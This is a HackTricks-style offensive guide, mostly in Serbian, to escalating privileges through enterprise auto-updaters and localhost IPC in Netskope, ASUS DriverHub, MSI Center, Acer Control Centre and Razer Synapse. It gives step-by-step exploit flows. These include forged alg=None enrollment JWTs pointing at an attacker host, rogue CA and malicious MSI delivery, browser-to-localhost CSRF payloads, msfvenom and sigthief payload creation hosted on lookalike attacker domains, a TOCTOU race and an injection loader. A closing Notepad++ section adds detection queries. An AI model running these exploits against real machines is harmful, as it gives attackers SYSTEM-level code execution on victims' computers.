# Zloupotreba Enterprise Auto-Updaters i privilegisanog IPC-a (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica generalizuje klasu Windows local privilege escalation lanaca pronađenih u enterprise endpoint agentima i updaterima koji izlažu low-friction IPC površinu i privilegovani update flow. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde low-privileged korisnik može primorati enrollment na server pod kontrolom napadača i zatim dostaviti maliciozni MSI koji SYSTEM servis instalira.

Ključne ideje koje možete ponovo upotrebiti protiv sličnih proizvoda:
- Zloupotrebite privilegovani servisov localhost IPC da biste prisilili re-enrollment ili rekonfiguraciju na napadačev server.
- Implementirajte vendor-ove update endpoint-e, isporučite rogue Trusted Root CA, i usmerite updater na maliciozni, "signed" paket.
- Izbegavajte slab proveru potpisivača (CN allow-lists), opciona digest polja, i labave MSI osobine.
- Ako je IPC "encrypted", izvedite key/IV iz machine identifikatora čitljivih svima koji se čuvaju u registry-ju.
- Ako servis ograničava pozivaoce po image path/process name, inject-ujte u allow-listed proces ili spawn-ujte jedan suspended i bootstrap-ujte vaš DLL preko minimalnog thread-context patch-a.

---
## 1) Prisilno preusmeravanje na napadačev server pomoću localhost IPC

Mnogi agenti isporučuju user-mode UI proces koji razgovara sa SYSTEM servisom preko localhost TCP koristeći JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok exploita:
1) Sastavite JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristite alg=None tako da potpis nije potreban.
2) Pošaljite IPC poruku koja poziva provisioning command sa vašim JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da kontaktira vaš lažni server radi registracije/konfiguracije, e.g.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Kada klijent uspostavi vezu sa vašim serverom, implementirajte očekivane endpoint-e i usmerite ga na napadački MSI. Tipičan sled:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata koji pokazuje na zlonamerni MSI i lažnu verziju.

Bypassing common checks seen in the wild:
- Signer CN allow-list: servis može jedino proveravati da li je Subject CN jednak “netSkope Inc” ili “Netskope, Inc.”. Vaš zlonamerni CA može izdata leaf sa tim CN i potpisati MSI.
- CERT_DIGEST property: uključite benigni MSI property nazvan CERT_DIGEST. Nema sprovođenja pri instalaciji.
- Optional digest enforcement: config flag (npr. check_msi_digest=false) onemogućava dodatnu kriptografsku validaciju.

Rezultat: SYSTEM servis instalira vaš MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
izvršavajući proizvoljan kod kao NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Od R127, Netskope je umotao IPC JSON u polje encryptData koje liči na Base64. Reverzno inženjerstvo je pokazalo AES sa key/IV izvedenim iz vrednosti u registru čitljivih za bilo kog korisnika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu reprodukovati enkripciju i poslati validne enkriptovane komande iz standardnog korisnika. Opšti savet: ako agent iznenada "encrypts" svoj IPC, potražite device ID-jeve, product GUID-e, install ID-je pod HKLM kao materijal za ključ/IV.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Neki servisi pokušavaju da autentifikuju peer tako što reše PID TCP konekcije i uporede image path/name sa allow-listovanim vendor binarima lociranim pod Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična zaobilaženja:
- DLL injection u allow-listovan proces (npr. nsdiag.exe) i proxy-ovanje IPC iznutra.
- Pokrenite allow-listovan binar suspendovan i bootstrap-ujte vaš proxy DLL bez CreateRemoteThread (vidi §5) da biste zadovoljili pravila koja nameće driver protiv tamperovanja.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Proizvodi često dolaze sa minifilter/OB callbacks driverom (npr. Stadrv) koji skida opasna prava sa handle-ova za zaštićene procese:
- Process: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user-mode loader koji poštuje ova ograničenja:
1) CreateProcess vendor binara sa CREATE_SUSPENDED.
2) Nabavite handle-ove koje vam je i dalje dozvoljeno: PROCESS_VM_WRITE | PROCESS_VM_OPERATION na procesu, i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patchujete kod na poznatom RIP).
3) Prepišite ntdll!NtContinue (ili neki drugi rani, garantovano mapirani thunk) malim stub-om koji poziva LoadLibraryW na putanji vaše DLL, pa onda skace nazad.
4) ResumeThread da pokrenete stub u procesu, učitavajući vašu DLL.

Pošto nikada niste koristili PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME na već zaštićenom procesu (vi ste ga kreirali), politika drivera je zadovoljena.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje zlonamernog MSI i servira potrebne endpoint-e: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope je custom IPC client koji kreira proizvoljne (opciono AES-enkriptovane) IPC poruke i uključuje suspended-process injection da poteknu iz allow-listovanog binara.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Kada se suočite sa novim endpoint agentom ili motherboard “helper” suite-om, brz workflow obično je dovoljan da utvrdite da li imate obećavajući privesc target:

1) Enumerate loopback listeners i mapirajte ih nazad na vendor procese:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Nabrojte kandidatne named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Izdvojite registry-backed routing data koje koriste plugin-based IPC servers:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Prvo izvucite endpoint names, JSON keys i command IDs iz user-mode klijenta. Pakirani Electron/.NET frontends često leak celu schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
Ako cilj autentifikuje pozivaoce samo po PID-u, image path-u ili imenu procesa, tretirajte to više kao prepreku nego kao granicu: injektovanje u legitimnog klijenta, ili uspostavljanje konekcije iz procesa koji je na allow-listi, često je dovoljno da zadovolji provere servera. Za named pipes konkretno, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF protiv privilegisanih HTTP API-ja (ASUS DriverHub)

DriverHub isporučuje user-mode HTTP servis (ADU.exe) na 127.0.0.1:53000 koji očekuje browser pozive koji dolaze sa https://driverhub.asus.com. Origin filter jednostavno izvršava `string_contains(".asus.com")` nad Origin headerom i nad download URL-ovima izloženim preko `/asus/v1.0/*`. Svaki host pod kontrolom napadača, kao što je `https://driverhub.asus.com.attacker.tld`, zato prolazi proveru i može izvesti zahteve koji menjaju stanje iz JavaScript-a. Pogledajte [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne obrasce zaobilaženja.

Praktičan tok:
1) Registrujte domen koji u sebi sadrži `.asus.com` i postavite zlonamerni web sajt tamo.
2) Koristite `fetch` ili XHR da pozovete privilegovani endpoint (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON body koji handler očekuje – packed frontend JS prikazuje šemu ispod.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Čak i PowerShell CLI prikazan ispod uspeva kada je Origin header spoofed na pouzdanu vrednost:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne fajlove definisane u JSON telu i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation ponovo koristi istu substring logiku, tako da je `http://updates.asus.com.attacker.tld:8000/payload.exe` prihvaćen. Nakon preuzimanja, ADU.exe samo proverava da PE sadrži potpis i da Subject string odgovara ASUS pre pokretanja – no `WinVerifyTrust`, no chain validation.

Da bi se iskoristio tok:
1) Kreirajte payload (npr., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS-ov signer u njega (npr., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na `.asus.com` lookalike domenu i trigger-ujte UpdateApp preko browser CSRF-a gore.

Pošto su i Origin i URL filteri zasnovani na substringu i provera signer-a samo upoređuje stringove, DriverHub povlači i izvršava napadačev binarni fajl u svom povišenom kontekstu.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service izlaže TCP protokol gde je svaki frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Kopira prosleđeni izvršni fajl u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Proverava potpis preko `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Kreira scheduled task koji pokreće temp file kao SYSTEM sa attacker-controlled argumentima.

The copied file is not locked between verification and `ExecuteTask()`. Napadač može:
- Poslati Frame A koji pokazuje na legitimni MSI-signed binary (garantuje da provera potpisa prođe i da se task stavi u red).
- Utrkivati se sa ponavljanim Frame B porukama koje pokazuju na zlonamerni payload, prepisujući `MSI Center SDK.exe` odmah nakon što verifikacija završi.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Svaki plugin/DLL koji učita `MSI.CentralServer.exe` dobija Component ID sačuvan pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta frame-a biraju tu komponentu, omogućavajući napadačima da usmere komande ka proizvoljnim modulima.
- Plugin-i mogu definisati sopstvene task runnere. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` sa **no signature validation** – bilo koji lokalni korisnik može da ga usmeri na `C:\Users\<user>\Desktop\payload.exe` i dobije SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy brzo otkriva mapiranje Component ↔ command; custom Go/ Python klijenti zatim mogu da replay-uju frame-ove.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, i njegov discretionary ACL dozvoljava remote clients (npr. `\\TARGET\pipe\treadstone_service_LightMode`). Slanje command ID `7` sa putanjom fajla poziva rutinu servisa za pokretanje procesa.
- Klijentska biblioteka serijalizuje magic terminator byte (113) zajedno sa args. Dinamičko instrumentovanje sa Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) pokazuje da native handler mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i integrity SID pre poziva `CreateProcessAsUser`.
- Zamena 113 (`0x71`) za 114 (`0x72`) ulazi u generičku granu koja zadržava pun SYSTEM token i postavlja high-integrity SID (`S-1-16-12288`). Pokrenuti binarni fajl dakle radi kao unrestricted SYSTEM, i lokalno i na udaljenim mašinama.
- Kombinujte to sa izloženim installer flagom (`Setup.exe -nocheck`) da podignete ACC čak i na lab VM-ovima i testirate pipe bez vendor hardvera.

Ovi IPC bagovi ilustruju zašto localhost servisi moraju zahtevati mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) i zašto svaki modulov “run arbitrary binary” helper mora imati iste provere signer-a.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 je dodao još jedan koristan obrazac ovoj familiji: nisko-privilegovan korisnik može zatražiti od COM helpera da pokrene proces preko `RzUtility.Elevator`, dok je odluka o poverenju delegirana user-mode DLL-u (`simple_service.dll`) umesto da bude strogo sprovedena unutar privilegovanog domena.

Observed exploitation path:
- Instancirati COM objekat `RzUtility.Elevator`.
- Pozvati `LaunchProcessNoWait(<path>, "", 1)` da zatražite pokretanje sa povišenim privilegijama.
- U javnom PoC-u, PE-signature gate unutar `simple_service.dll` je patched out pre slanja zahteva, što dozvoljava pokretanje proizvoljnog izvršnog fajla kojeg izabere napadač.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Daljinsko preotimanje lanca snabdevanja zbog slabe validacije updatera (WinGUp / Notepad++)

Stariji WinGUp-bazirani Notepad++ updaters nisu potpuno verifikovali autentičnost ažuriranja. Kada su napadači kompromitovali hosting provajdera update servera, mogli su da manipulišu XML manifestom i preusmere samo odabrane klijente na napadačke URL-ove. Pošto klijent prihvata bilo koji HTTPS odgovor bez insistiranja na istovremenoj proverenosti pouzdanog lanca sertifikata i važećeg PE potpisa, žrtve su preuzimale i izvršavale trojanizovani NSIS `update.exe`.

Operativni tok (nije potreban lokalni exploit):
1. **Infrastructure interception**: kompromitujte CDN/hosting i odgovorite na update provere sa napadačkim metadata koje upućuju na zlonamerni URL za preuzimanje.
2. **Trojanized NSIS**: installer preuzima/izvodi payload i zloupotrebljava dve izvršne lance:
- **Bring-your-own signed binary + sideload**: pakuje se potpisani Bitdefender `BluetoothService.exe` i spusti zlonamerni `log.dll` u njegov search path. Kada se potpisani binary pokrene, Windows sideload-uje `log.dll`, koji dešifruje i reflectively učitava Chrysalis backdoor (Warbird-protected + API hashing da oteža statičku detekciju).
- **Scripted shellcode injection**: NSIS izvršava kompajlirani Lua skript koji koristi Win32 API-je (npr. `EnumWindowStationsW`) za injektovanje shellcode-a i postavljanje Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Primorajte **certificate + signature verification** za preuzeti installer (pin-ujte vendor signer, odbijajte mismatched CN/chain) i potpišite sam update manifest (npr. XMLDSig). Blokirajte manifest-kontrolisane redirect-ove osim ako nisu validirani.
- Smatrajte **BYO signed binary sideloading** kao pivot za detekciju posle preuzimanja: alarmirajte kada potpisani vendor EXE učita DLL ime sa van njegove kanonske instalacione putanje (npr. Bitdefender učitava `log.dll` iz Temp/Downloads) i kada updater spusti/izvrši instalere iz temp foldera sa potpisima koji nisu od vendor-a.
- Pratite **malware-specific artifacts** uočene u ovom lancu (korisno kao generički pivot): mutex `Global\Jdhfv_1.0.1`, anomalna `gup.exe` pisanja u `%TEMP%`, i Lua-pokrenute faze injekcije shellcode-a.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalacioni program koji nije Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ovi obrasci se odnose na bilo koji updater koji prihvata nepotpisane manifeste ili ne uspeva da ograniči potpisivače instalera — presretanje mreže + zlonamerni installer + BYO-signed sideloading dovodi do izvršavanja koda na daljinu pod izgovorom "pouzdanih" ažuriranja.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
